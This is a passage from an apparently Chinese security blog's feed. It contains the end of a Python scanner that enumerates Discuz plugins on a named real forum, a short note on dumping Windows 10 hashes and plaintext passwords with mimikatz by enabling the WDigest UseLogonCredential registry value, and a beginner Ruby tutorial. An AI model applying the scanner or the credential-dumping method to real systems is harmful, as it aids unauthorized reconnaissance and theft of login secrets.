MSIE 5.5; Windows NT)&#39;&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; headers &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;User-Agent&#39;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; user_agent &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; request &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; urllib2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;headers &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; headers&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; response &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; urllib2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;urlopen&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; content &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; response&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;utf8&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; content&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;u&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;\u63d2\u4ef6\u4e0d\u5b58\u5728\u6216\u5df2\u5173\u95ed&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;#pass&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;__notfind&#39;&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;____find&#39;&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; list&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; urllib2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;URLError&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; e&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; open&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;error.txt&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;\n&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; hasattr&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;code&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; e&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; hasattr&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;reason&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; e&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;reason&lt;/span&gt;24.25.26.27. &lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; __name__ &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; host &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;http://bbs.tuniu.com&#39;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; list &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; i &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; open&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;dzpluginlist_t.txt&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;readlines&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;():&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;#print i.strip()&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; checkplugin&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; l &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; list&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;[-] &#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;/plugin.php?id=&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;l&lt;/span&gt;3.项目地址https://github.com/Tycx2ry/discuz-plugin-scan 来自为知笔记(Wiz)]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[windows 10 dump hash and plaintext passwords]]></title>
    <url>%2F2015%2F09%2F09%2Fwindows-10-dump-hash-and-plaintext-passwords%2F</url>
    <content type="text"><![CDATA[工具：mimkatz2.0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;https://github.com/gentilkiwi/mimikatz&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RWMC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;https://github.com/giMini/RWMC&nbsp;&nbsp;使用：http://sysadminconcombre.blogspot.ca/2015/07/how-to-hack-windows-password.html关键是要开启HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigestUseLogonCredential键值设置为1缺陷：windows默认设置是0，设置为1后需要重新启动 来自为知笔记(Wiz)]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[ruby入门学习]]></title>
    <url>%2F2015%2F09%2F06%2Fruby-e5-85-a5-e9-97-a8-e5-ad-a6-e4-b9-a0%2F</url>
    <content type="text"><![CDATA[1.BEGIN/END 语法1. &lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;2.3. &lt;span class=&quot;pln&quot;&gt;puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;This is main Ruby Program&quot;&lt;/span&gt;4.5. &lt;span class=&quot;pln&quot;&gt;END &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{&lt;/span&gt;6. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp; &amp;nbsp;puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Terminating Ruby Program&quot;&lt;/span&gt;7. &lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt;8. &lt;span class=&quot;pln&quot;&gt;BEGIN &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{&lt;/span&gt;9. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp; &amp;nbsp;puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Initializing Ruby Program&quot;&lt;/span&gt;10. &lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt;这将产生以下结果：1. &lt;span class=&quot;typ&quot;&gt;Initializing&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Ruby&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Program&lt;/span&gt;2. &lt;span class=&quot;typ&quot;&gt;This&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; is main &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Ruby&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Program&lt;/span&gt;3. &lt;span class=&quot;typ&quot;&gt;Terminating&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Ruby&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Program&lt;/span&gt; 2.注释语法单行注释： #多行注释：1. &lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;begin&lt;/span&gt;2. &lt;span class=&quot;typ&quot;&gt;This&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; is a comment&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;3. &lt;span class=&quot;typ&quot;&gt;This&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; is a comment&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; too&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;4. &lt;span class=&quot;typ&quot;&gt;This&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; is a comment&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; too&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;5. &lt;span class=&quot;pln&quot;&gt;I said that already&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;6. &lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt; 3.变量局部变量 wenxiao实例变量 @wenxiao类变量 @@wenxiao全局变量 $wenxiao 4.类1. &lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;3. &lt;span class=&quot;kwd&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Sample&lt;/span&gt;4. &lt;span class=&quot;typ&quot;&gt; @@wenxiao_a&lt;/span&gt;5. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp; &amp;nbsp;def&amp;nbsp;initialize()&lt;/span&gt;6. &lt;span class=&quot;pln&quot;&gt; @wenxiao_b&lt;/span&gt;7. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;hello init&quot;&lt;/span&gt;8. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp; &amp;nbsp;end&lt;/span&gt;9. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; def hello()&lt;/span&gt;10. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Hello Ruby!&quot;&lt;/span&gt;11. &lt;span class=&quot;str&quot;&gt; puts &quot;bc#@wenxiao_b&quot; &lt;/span&gt;12. &lt;span class=&quot;str&quot;&gt; puts &quot;#@@wenxiao_a&quot;&lt;/span&gt;13. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; end&lt;/span&gt;14. &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;15. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;16. &lt;span class=&quot;com&quot;&gt;# Now using above class to create objects&lt;/span&gt;17. &lt;span class=&quot;pln&quot;&gt;object &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Sample&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;new&lt;/span&gt;18. &lt;span class=&quot;pln&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;hello&lt;/span&gt; 5.数组例子1: &lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;ary &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;fred&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3.14&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;This is a string&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;last element&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;ary&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;each &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;do&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts i&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;这将产生以下结果： &lt;span class=&quot;pln&quot;&gt;fred&lt;/span&gt; &lt;span class=&quot;lit&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;lit&quot;&gt;3.14&lt;/span&gt; &lt;span class=&quot;typ&quot;&gt;This&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; is a string&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;last element&lt;/span&gt;例子2: &lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;hsh &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; colors &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;red&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0xf00&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;green&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0x0f0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;blue&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0x00f&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;hsh&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;each &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;do&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; value&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; print key&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot; is &quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; value&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;\n&quot;&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;这将产生以下结果： &lt;span class=&quot;pln&quot;&gt;green is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;240&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;red is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3840&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;blue is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;15&lt;/span&gt;迭代器 &lt;span class=&quot;pln&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1.&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1.&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt; &lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;10.&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;each &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;do&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; print n&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39; &#39;&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;这将产生以下结果： &lt;span class=&quot;lit&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;15&lt;/span&gt; 6.defined?操作符defined? 是一个特殊的操作符采取的形式的方法调用，以确定是否通过表达式定义。如果没有被定义的表达式，它返回一个描述字符串求解出的表达式或nil&nbsp;有很多种用法 defined? 操作符:&nbsp;1. &lt;span class=&quot;pun&quot;&gt;用法&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;2. &lt;span 